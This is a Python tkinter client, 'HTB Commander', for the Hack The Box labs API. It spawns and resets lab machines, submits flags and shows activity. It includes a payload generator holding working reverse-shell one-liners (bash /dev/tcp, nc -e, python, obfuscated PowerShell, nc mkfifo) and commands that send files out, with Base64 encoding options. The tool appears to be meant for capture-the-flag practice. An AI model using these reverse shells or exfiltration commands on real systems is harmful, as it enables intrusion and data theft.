import requests
import os
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from dotenv import load_dotenv
from datetime import datetime, timezone
import tkinter.font as tkfont
import base64
from urllib.parse import quote
import threading

load_dotenv()
token = os.getenv("TOKEN")

if not token:
	messagebox.showerror("Error", "Token not defined in .env file")
	exit()

headers = {
	"Authorization": f"Bearer {token}",
	"User-Agent": "Mozilla/5.0",
	"Accept": "application/json, text/plain, */*",
}

# Endpoints
list_machines_url = "https://labs.hackthebox.com/api/v4/season/machines"
activate_machine_url = "https://labs.hackthebox.com/api/v4/vm/spawn"
status_machine_url = "https://labs.hackthebox.com/api/v4/machine/active"
stop_machine_url = "https://labs.hackthebox.com/api/v4/vm/terminate"
submit_flag_url = "https://labs.hackthebox.com/api/v4/machine/own"
reset_machine_url = "https://labs.hackthebox.com/api/v4/vm/reset"
activity_url = "https://labs.hackthebox.com/api/v4/machine/owns/top"

session = requests.Session()
# session.proxies = {"https": "http://127.0.0.1:8080"}
# session.verify = False

def list_machines():
	response = session.get(list_machines_url, headers=headers, timeout=20)
	return response.json().get("data", []) if response.status_code == 200 else []

def activate_machine(machine_id):
	payload = {"machine_id": machine_id}
	response = session.post(activate_machine_url, headers=headers, json=payload, timeout=20)
	if response.status_code == 200:
		return True, response.json().get("message", "Machine spawned successfully")
	try:
		error_data = response.json()
		return False, error_data.get("message", "Unknown error")
	except:
		return False, f"Error {response.status_code}: {response.text}"

def stop_machine():
	response = session.post(stop_machine_url, headers=headers, timeout=20)
	return response.status_code == 200

def get_machine_status():
	response = session.get(status_machine_url, headers=headers, timeout=20)
	return response.json().get("info", {}) if response.status_code == 200 else None

def submit_flag(machine_id, flag):
	payload = {"machine_id": machine_id, "flag": flag}
	response = session.post(submit_flag_url, headers=headers, json=payload, timeout=20)
	return response.status_code == 200

def reset_machine(machine_id):
	payload = {"machine_id": machine_id}
	response = session.post(reset_machine_url, headers=headers, json=payload, timeout=20)
	if response.status_code == 200:
		return True, response.json().get("message", "Machine reset successfully")
	try:
		error_data = response.json()
		return False, error_data.get("message", "Unknown error")
	except:
		return False, f"Error {response.status_code}: {response.text}"
def parse_htb_time(time_str):
	if isinstance(time_str, datetime):
		return time_str.replace(tzinfo=timezone.utc)
		
	try:
		dt = datetime.strptime(time_str, "%Y-%m-%dT%H:%M:%S.%fZ")
	except ValueError:
		dt = datetime.strptime(time_str, "%Y-%m-%dT%H:%M:%S")
	
	return dt.replace(tzinfo=timezone.utc)

class HTBGUI:
	def __init__(self, root):
		self.root = root
		self.root.title("HTB Commander")
		self.root.geometry("800x600")
		self.machine_dict = {}
		self.reset_btn = None
		self.copy_ip_btn = None
		self.current_machine_data = None
		
		self.setup_style()
		self.setup_layout()
		self.load_machines()
		self.setup_activity()
		self.bind_events()
		
		self.update_activity()
		self.update_release_timer()

	def update_release_timer(self):
		if self.current_machine_data:
			release_time_str = self.current_machine_data.get("release_time")
			if release_time_str:
				release_time = parse_htb_time(release_time_str)
				remaining = self.time_until_release(release_time)
				self.status_labels["expires_at"].config(text=f"{remaining}")
		
		self.root.after(1000, self.update_release_timer)

	def setup_style(self):
		self.style = ttk.Style()
		self.style.theme_use('clam')
		
		# Paleta de colores
		bg_color = '#1a1a1a'
		accent_color = '#2a7f3f'
		text_color = '#c0c0c0'
		panel_bg = '#2a2a2a'
		
		# Configuración general
		self.style.configure('.', 
							background=bg_color, 
							foreground=text_color)
		
		# Botones
		self.style.configure('TButton', 
							background=panel_bg,
							foreground=text_color,
							borderwidth=1,
							relief='flat',
							font=('Iosevka Nerd Font', 10))
		self.style.map('TButton',
					background=[('active', accent_color), ('disabled', bg_color)],
					foreground=[('active', '#ffffff')])
		
		# Combobox y su menú desplegable
		self.style.configure('TCombobox',
							fieldbackground=panel_bg,
							foreground=text_color,
							background=panel_bg,
							arrowsize=12,
							arrowpadding=5,
							padding=(5, 2, 5, 2))
		
		self.style.configure('TCombobox.Listbox',
							background=panel_bg,
							foreground=text_color,
							selectbackground=accent_color,
							selectforeground=text_color,
							borderwidth=0,
							relief='flat',
							font=('Iosevka Nerd Font', 9))
		
		self.style.map('TCombobox',
					fieldbackground=[('readonly', panel_bg)],
					background=[('readonly', panel_bg)],
					arrowcolor=[('readonly', text_color)])
		
		# Etiquetas y marcos
		self.style.configure('TLabel', 
							background=bg_color,
							foreground=text_color)
		
		self.style.configure('TLabelframe',
							background=bg_color,
							relief='flat')
		
		self.style.configure('TLabelframe.Label',
							background=bg_color,
							foreground=accent_color)
		
		# Campos de entrada
		self.style.configure('TEntry',
							fieldbackground=panel_bg,
							insertcolor=text_color)
		
		# Configurar color de fondo de la ventana
		self.root.configure(bg=bg_color)
		

	def setup_layout(self):
		# Panel principal
		main_panel = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
		main_panel.pack(fill=tk.BOTH, expand=True)
		
		# Panel izquierdo
		left_panel = ttk.Frame(main_panel, width=200)
		main_panel.add(left_panel, weight=0)
		self.setup_left_panel(left_panel)
		
		# Panel derecho
		right_panel = ttk.Frame(main_panel)
		main_panel.add(right_panel, weight=1)
		self.setup_right_panel(right_panel)
		
		# Consola y Activity
		self.setup_console()
	def update_payload_list(self, event=None):
		category = self.payload_category.get()
		if category in self.payloads:
			self.payload_name['values'] = list(self.payloads[category].keys())
			self.payload_name.current(0)
			self.generate_payload()

	def generate_payload(self, event=None):
		try:
			category = self.payload_category.get()
			name = self.payload_name.get()
			ip = self.payload_ip.get()
			port = self.payload_port.get()
			
			template = self.payloads[category][name]
			payload = template.replace("{IP}", ip).replace("{PORT}", port)
			
			self.payload_text.config(state=tk.NORMAL)
			self.payload_text.delete(1.0, tk.END)
			self.payload_text.insert(tk.END, payload)
			self.payload_text.config(state=tk.DISABLED)
		except Exception as e:
			self.log_to_console(f"Error generating payload: {str(e)}")

	def copy_payload(self):
		payload = self.payload_text.get(1.0, tk.END).strip()
		if payload:
			self.root.clipboard_clear()
			self.root.clipboard_append(payload)
			self.log_to_console("Payload copied to clipboard")
	def setup_left_panel(self, parent):
		main_frame = ttk.Frame(parent)
		main_frame.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

		# Sección de Máquinas
		machine_frame = ttk.LabelFrame(main_frame, text="Machines Control")
		machine_frame.pack(fill=tk.X, pady=5)
		
		# Combobox de máquinas
		self.machine_list = ttk.Combobox(machine_frame, 
									state="readonly", 
									font=('Iosevka Nerd Font', 9))
		self.machine_list.pack(pady=5, fill=tk.X, padx=5)
		
		# Grid de botones de control
		btn_grid = ttk.Frame(machine_frame)
		btn_grid.pack(fill=tk.X, pady=5)
		
		control_buttons = [
			("⟳ Refresh", self.load_machines),
			("▶ Spawn", self.spawn_machine),
			("⏹ Stop", self.stop_machine),
			("🔄 Reset", self.reset_machine)
		]
		
		for col, (text, command) in enumerate(control_buttons):
			ttk.Button(btn_grid, 
					text=text, 
					style='TButton',
					command=command).grid(row=0, column=col, padx=2, sticky='ew')
			btn_grid.columnconfigure(col, weight=1)

		# Sección de Payloads
		payload_frame = ttk.LabelFrame(main_frame, text="Payload Generator")
		payload_frame.pack(fill=tk.BOTH, expand=True, pady=5)
		payload_frame.columnconfigure(1, weight=1)
		
		rows = [
			('Category:', ttk.Combobox(payload_frame, state="readonly", font=('Iosevka Nerd Font', 9))), 
			('Type:', ttk.Combobox(payload_frame, state="readonly", font=('Iosevka Nerd Font', 9))),
			('Encoding:', ttk.Combobox(
				payload_frame, 
				values=["None", "Base64", "URL Encode", "Base64 utf-16le"], 
				state="readonly",
				font=('Iosevka Nerd Font', 9)
			)),
			('IP Address:', ttk.Entry(payload_frame, font=('Iosevka Nerd Font', 9))),
			('Port:', ttk.Entry(payload_frame, font=('Iosevka Nerd Font', 9)))
		]
		
		for row, (label_text, widget) in enumerate(rows):
			ttk.Label(payload_frame, text=label_text, font=('Iosevka Nerd Font', 9))\
				.grid(row=row, column=0, sticky='w', padx=5, pady=2)
			widget.grid(row=row, column=1, sticky='ew', padx=5, pady=2)
		
		# Asignar widgets a variables de clase
		self.payload_category, self.payload_name, self.encoding_type, self.payload_ip, self.payload_port = \
			(widget for _, widget in rows)
		
		# Valores iniciales
		self.payload_ip.insert(0, "10.10.14.X")
		self.payload_port.insert(0, "1337")
		self.encoding_type.current(0)
		
		# Preview del Payload
		ttk.Label(payload_frame, text="Preview:", font=('Iosevka Nerd Font', 9, 'bold'))\
			.grid(row=5, column=0, columnspan=2, sticky='w', padx=5, pady=(10,2))
		
		self.payload_text = scrolledtext.ScrolledText(
			payload_frame,
			height=6,
			wrap=tk.WORD,
			bg='#2a2a2a',
			fg='#c0c0c0',
			font=('Consolas', 9)
		)
		self.payload_text.grid(row=6, column=0, columnspan=2, sticky='nsew', padx=5, pady=(0,5))
		
		# Botón de copiar
		ttk.Button(payload_frame, 
				text="📋 Copy Payload", 
				style='Accent.TButton',
				command=self.copy_payload)\
			.grid(row=7, column=0, columnspan=2, sticky='ew', padx=5, pady=5)
		
		# Configuración final
		payload_frame.rowconfigure(6, weight=1)
		
		self.payloads = {
			"Reverse Shells": {
				"bash": "setsid /bin/bash -c \"/bin/bash &>/dev/tcp/{IP}/{PORT} 0>&1\"",
				"nc": "nc -e /bin/sh {IP} {PORT}",
				"python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
				"powershell": """$XD=New-Object Net.Sockets.TCPClient('{IP}', {PORT});$XDD=$XD.GetStream();$XDDDDD=New-Object IO.StreamWriter($XDD);function WriteToStream ($XDDDDDD) { [byte[]]$script:Buffer=0..$XD.ReceiveBufferSize | ForEach-Object {0};$XDDDDD.Write($XDDDDDD + (Get-Location).Path.ToString() + '> ');$XDDDDD.Flush() };WriteToStream '';while(($XDDD=$XDD.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command=([text.encoding]::UTF8).GetString($Buffer, 0, $XDDD - 1);$XDDDD=try { Invoke-Expression "$Command 2>&1" | Out-String } catch { $_ | Out-String }; WriteToStream ($XDDDD) }; $XDDDDD.Close()""",
				"nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f"
			},
			"File Transfer": {
				"bash Send": "cat file.txt > /dev/tcp/{IP}/{PORT}",
				"bash Receive": "cat </dev/tcp/{IP}/{PORT} > file.txt",
				"uploadserver Upload": "curl -F files=@file.txt http://{IP}:{PORT}/upload"
			}
		}
		
		# Inicializar comboboxes
		self.payload_category['values'] = list(self.payloads.keys())
		self.payload_category.current(0)
		self.update_payload_list()
		
		# Configurar eventos
		events = [
			(self.payload_category, self.update_payload_list),
			(self.payload_name, self.generate_payload),
			(self.payload_ip, self.generate_payload),
			(self.payload_port, self.generate_payload),
			(self.encoding_type, self.generate_payload)
		]
		
		for widget, callback in events:
			if isinstance(widget, ttk.Combobox):
				widget.bind("<<ComboboxSelected>>", callback)
			else:
				widget.bind("<KeyRelease>", callback)
	def generate_payload(self, event=None):
		try:
			# Generar payload base
			category = self.payload_category.get()
			name = self.payload_name.get()
			ip = self.payload_ip.get()
			port = self.payload_port.get()
			
			template = self.payloads[category][name]
			payload = template.replace("{IP}", ip).replace("{PORT}", port)
			
			# Aplicar encoding
			encoding = self.encoding_type.get()
			if encoding == "Base64":
				payload = base64.b64encode(payload.encode()).decode()
			elif encoding == "URL Encode":
				payload = quote(payload)
			elif encoding == "Base64 utf-16le":
				payload = base64.b64encode(payload.encode('utf-16le')).decode()
				
			# Actualizar vista
			self.payload_text.config(state=tk.NORMAL)
			self.payload_text.delete(1.0, tk.END)
			self.payload_text.insert(tk.END, payload)
			self.payload_text.config(state=tk.DISABLED)
			
		except Exception as e:
			self.log(f"Error: {str(e)}")
	def setup_right_panel(self, parent):
		status_frame = ttk.LabelFrame(parent, text="Machine Info")
		status_frame.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
		
		# Header
		header = ttk.Frame(status_frame)
		header.pack(fill=tk.X, padx=5, pady=5)
		ttk.Label(header, text="Current Status", font=('Iosevka Nerd Font', 9, 'bold')).pack(side=tk.LEFT)
		ttk.Button(header, text="⟳ Refresh", command=self.check_status, width=10).pack(side=tk.RIGHT)
		
		# Grid de estado
		grid_frame = ttk.Frame(status_frame)
		grid_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
		fields = [
			("Machine Name:", "name"),
			("IP Address:", "ip"),
			("Type:", "type"),
			("Lab Server:", "lab_server"),
			("Release:", "expires_at")
		]
		self.status_labels = {}
		for row, (label, key) in enumerate(fields):
			ttk.Label(grid_frame, text=label, font=('Iosevka Nerd Font', 9, 'bold')).grid(row=row, column=0, sticky=tk.W, padx=5, pady=2)
			self.status_labels[key] = ttk.Label(grid_frame, text="N/A", font=('Iosevka Nerd Font', 9), foreground='#3fbf7f')
			self.status_labels[key].grid(row=row, column=1, sticky=tk.W, pady=2)
			if key == "ip":
				self.copy_ip_btn = ttk.Button(grid_frame,
											  text="📋",
											  command=self.copy_ip,
											  width=3,
											  state='disabled')
				self.copy_ip_btn.grid(row=row, column=2, padx=5)

		# Sección de flag
		flag_frame = ttk.LabelFrame(parent, text="Submit Flag")
		flag_frame.pack(padx=10, pady=10, fill=tk.X)
		self.flag_entry = ttk.Entry(flag_frame, font=('Iosevka Nerd Font', 10))
		self.flag_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
		ttk.Button(flag_frame, text="🚩 Submit", command=self.submit_flag).pack(side=tk.RIGHT, padx=5)

	def setup_console(self):
		console_panel = ttk.PanedWindow(self.root, orient=tk.VERTICAL)
		console_panel.pack(padx=10, pady=5, fill=tk.BOTH, expand=True, side=tk.BOTTOM)
		
		# Sección Activity
		activity_frame = ttk.LabelFrame(console_panel, text="Activity")
		console_panel.add(activity_frame, weight=1)
		columns = ('position', 'name', 'rank', 'user_time', 'root_time', 'blood')
		self.activity_tree = ttk.Treeview(activity_frame,
										  columns=columns,
										  show='headings',
										  style='Custom.Treeview',
										  height=30)
		# Configuración de encabezados
		self.activity_tree.heading('position', text='Pos')
		self.activity_tree.heading('name', text='Name')
		self.activity_tree.heading('rank', text='Rank')
		self.activity_tree.heading('user_time', text='User Time')
		self.activity_tree.heading('root_time', text='Root Time')
		self.activity_tree.heading('blood', text='Blood')
		scrollbar = ttk.Scrollbar(activity_frame, orient=tk.VERTICAL, command=self.activity_tree.yview)
		self.activity_tree.configure(yscroll=scrollbar.set)
		scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
		self.activity_tree.pack(fill=tk.BOTH, expand=True)
		
		# Sección Console
		console_frame = ttk.LabelFrame(console_panel, text="Console")
		console_panel.add(console_frame, weight=1)
		self.console = scrolledtext.ScrolledText(console_frame,
												  bg='#2a2a2a',
												  fg='#c0c0c0',
												  insertbackground='white',
												  font=('Consolas', 8),
												  state='disabled')
		self.console.pack(fill=tk.BOTH, expand=True)

	def setup_activity(self):
		# Fuente para el Treeview
		self.activity_font = ('Iosevka Nerd Font', 8)
		self.header_font = ('Iosevka Nerd Font', 8, 'bold')
		# Configuración de estilo del Treeview
		self.style.configure('Custom.Treeview', 
							 background='#2a2a2a',
							 foreground='#c0c0c0',
							 fieldbackground='#2a2a2a',
							 font=self.activity_font,
							 rowheight=40)
		self.style.configure('Custom.Treeview.Heading', 
							 background='#1a1a1a',
							 foreground='#2a7f3f',
							 font=self.header_font,
							 relief='flat')
		self.style.map('Custom.Treeview', background=[('selected', '#2a7f3f')])
		# Configurar columnas
		self.activity_tree.column('position', width=40, anchor=tk.CENTER, stretch=False)
		self.activity_tree.column('name', width=160, anchor=tk.W)
		self.activity_tree.column('rank', width=90, anchor=tk.W)
		self.activity_tree.column('user_time', width=100, anchor=tk.CENTER)
		self.activity_tree.column('root_time', width=100, anchor=tk.CENTER)
		self.activity_tree.column('blood', width=60, anchor=tk.CENTER)
		for col in self.activity_tree['columns']:
			self.activity_tree.heading(col, anchor=tk.CENTER)

	def bind_events(self):
		# Al cambiar la selección se actualiza activity y status
		self.machine_list.bind("<<ComboboxSelected>>", self.on_machine_selected)

	def on_machine_selected(self, event):
		selected = self.machine_list.get()
		self.current_machine_data = self.machine_dict.get(selected)
		self.log_to_console(f"Selected machine: {selected}")
		self.update_activity()
		self.check_status()

	def update_activity(self):
		# Ejecutar la solicitud en un hilo separado
		threading.Thread(target=self.fetch_activity, daemon=True).start()
		self.root.after(10000 + 15000, self.update_activity)
	def time_until_release(self, release_time):
		if not isinstance(release_time, datetime):
			raise TypeError("release_time debe ser datetime")
		
		now = datetime.now(timezone.utc)
		delta = release_time - now
		
		if delta.total_seconds() <= 0:
			return "¡Released!"
		
		days = delta.days
		hours, rem = divmod(delta.seconds, 3600)
		minutes, seconds = divmod(rem, 60)
		
		return f"{days}d {hours:02}h {minutes:02}m {seconds:02}s"
	def fetch_activity(self):
		selected = self.machine_list.get()
		if not selected:
			self.root.after(0, lambda: self.log_to_console("No machine selected to update the activity", "warning"))
			self.root.after(0, lambda: self.activity_tree.delete(*self.activity_tree.get_children()))
		else:
			machine_id = self.machine_dict.get(selected).get("id", "")
			try:
				response = session.get(f"{activity_url}/{machine_id}", headers=headers, timeout=20)
				if response.status_code == 200:
					data = response.json().get("info", [])
					# Actualizar la UI en el hilo principal
					self.root.after(0, lambda: self.update_activity_tree(data))
				else:
					self.root.after(0, lambda: self.log_to_console(f"Activity update failed: {response.status_code}", "error"))
			except Exception as e:
				self.root.after(0, lambda: self.log_to_console(f"Activity error: {str(e)}", "error"))
	def update_activity_tree(self, data):
		# Limpiar datos anteriores
		for item in self.activity_tree.get_children():
			self.activity_tree.delete(item)
		for entry in data:
			blood_status = ""
			if entry.get('is_user_blood', False):
				blood_status += "🩸"
			if entry.get('is_root_blood', False):
				blood_status += "🩸"
			user_time = entry.get('user_own_time', '0H 00M 00S').replace('H', 'H ').replace('M', 'M ')
			root_time = entry.get('root_own_time', '0H 00M 00S').replace('H', 'H ').replace('M', 'M ')
			name = entry.get('name', 'Unknown')
			if len(name) > 15:
				name = f"{name[:12]}..."
			self.activity_tree.insert('', tk.END, values=(
				entry.get('position', '-'),
				name,
				entry.get('rank_text', '-'),
				user_time,
				root_time,
				blood_status
			))
		# Ajuste dinámico del ancho de columnas
		for col in self.activity_tree['columns']:
			children = self.activity_tree.get_children()
			
			if not children:
				self.activity_tree.column(col, width=100, minwidth=50)
				continue
			
			try:
				max_width = max(
					tkfont.Font(font=self.activity_font).measure(str(self.activity_tree.set(child, col)))
					for child in children
				)
				self.activity_tree.column(col, width=max_width + 20, minwidth=50)
			except Exception as e:
				print(f"Error ajustando columna {col}: {e}")

	def log_to_console(self, message, tag=None):
		self.console.configure(state='normal')
		self.console.insert(tk.END, f"> {message}\n", tag)
		self.console.configure(state='disabled')
		self.console.see(tk.END)

	def copy_ip(self):
		ip = self.status_labels["ip"].cget("text")
		if ip != "N/A":
			self.root.clipboard_clear()
			self.root.clipboard_append(ip)
			self.log_to_console(f"Copied IP to clipboard: {ip}")

	def load_machines(self):
		try:
			machines = list_machines()
			# Guardar todos los datos de la máquina en lugar de solo el ID
			self.machine_dict = {m.get("name"): m for m in machines}
			self.machine_list["values"] = list(self.machine_dict.keys())
			if self.machine_list["values"]:
				self.machine_list.current(0)
			self.log_to_console(f"Loaded {len(machines)} machines")
		except Exception as e:
			self.log_to_console(f"Error loading machines: {str(e)}", "error")

	def spawn_machine(self):
		selected = self.machine_list.get()
		if not selected:
			messagebox.showerror("Error", "Selecciona una máquina primero")
			return
		machine_id = self.machine_dict.get(selected)["id"]
		success, msg = activate_machine(machine_id)
		if success:
			self.log_to_console(f"Spawned machine: {selected}")
			self.check_status()
			messagebox.showinfo("Success", msg)
		else:
			self.log_to_console(f"Spawn failed: {msg}", "error")
			messagebox.showerror("Error", msg)

	def stop_machine(self):
		if stop_machine():
			self.log_to_console("Machine stopped")
			self.check_status()
			messagebox.showinfo("Success", "Machine stopped successfully")
		else:
			self.log_to_console("Failed to stop machine", "error")
			messagebox.showerror("Error", "Failed to stop machine")

	def reset_machine(self):
		selected = self.machine_list.get()
		if not selected:
			messagebox.showerror("Error", "Select a machine first")
			return
		machine_id = self.machine_dict.get(selected)["id"]
		success, msg = reset_machine(machine_id)
		if success:
			self.log_to_console(f"Reset machine: {selected}")
			self.check_status()
			messagebox.showinfo("Success", msg)
		else:
			self.log_to_console(f"Reset failed: {msg}", "error")
			messagebox.showerror("Error", msg)

	def check_status(self):
		try:
			status = get_machine_status()
			if status:
				self.status_labels["name"].config(text=status.get("name", "N/A"))
				ip = status.get("ip", "N/A")
				self.status_labels["ip"].config(text=ip)
				self.status_labels["type"].config(text=status.get("type", "N/A"))
				self.status_labels["lab_server"].config(text=status.get("lab_server", "N/A"))
				expires = status.get("expires_at", "N/A")
				if expires != "N/A":
					try:
						dt = datetime.strptime(expires, "%Y-%m-%d %H:%M:%S")
						expires = dt.strftime("%d/%m/%Y %H:%M:%S")
					except Exception as e:
						self.log_to_console(f"Date format error: {str(e)}", "error")
				self.status_labels["expires_at"].config(text=expires)
				self.copy_ip_btn.state(['!disabled' if ip != "N/A" else 'disabled'])
				self.log_to_console("Status updated successfully")
			else:
				if self.current_machine_data:
					release_time_str = self.current_machine_data.get("release_time")
					if release_time_str:
						release_time = parse_htb_time(release_time_str)
						remaining = self.time_until_release(release_time)
						self.status_labels["expires_at"].config(text=f"{remaining}")
					else:
						self.status_labels["expires_at"].config(text="N/A")
					
					self.status_labels["name"].config(text=self.current_machine_data.get("name", "N/A"))
				else:
					self.status_labels["expires_at"].config(text="N/A")
				
				self.status_labels["ip"].config(text="N/A")
				self.status_labels["type"].config(text="N/A")
				self.status_labels["lab_server"].config(text="N/A")
				self.copy_ip_btn.state(['disabled'])
				
				self.log_to_console("No active machine", "warning")
		except Exception as e:
			self.log_to_console(f"Error verifying status: {str(e)}", "error")

	def submit_flag(self):
		selected = self.machine_list.get()
		if not selected:
			messagebox.showerror("Error", "Select a machine first")
			return
		flag = self.flag_entry.get().strip()
		if not flag:
			messagebox.showerror("Error", "Enter a flag")
			return
		machine_id = self.machine_dict.get(selected)["id"]
		if submit_flag(machine_id, flag):
			self.log_to_console(f"Flag submitted for {selected}")
			self.flag_entry.delete(0, tk.END)
			messagebox.showinfo("Success", "Flag accepted!")
		else:
			self.log_to_console("Flag submission failed", "error")
			messagebox.showerror("Error", "Invalid flag")

if __name__ == "__main__":
	root = tk.Tk()
	app = HTBGUI(root)
	root.mainloop()
	
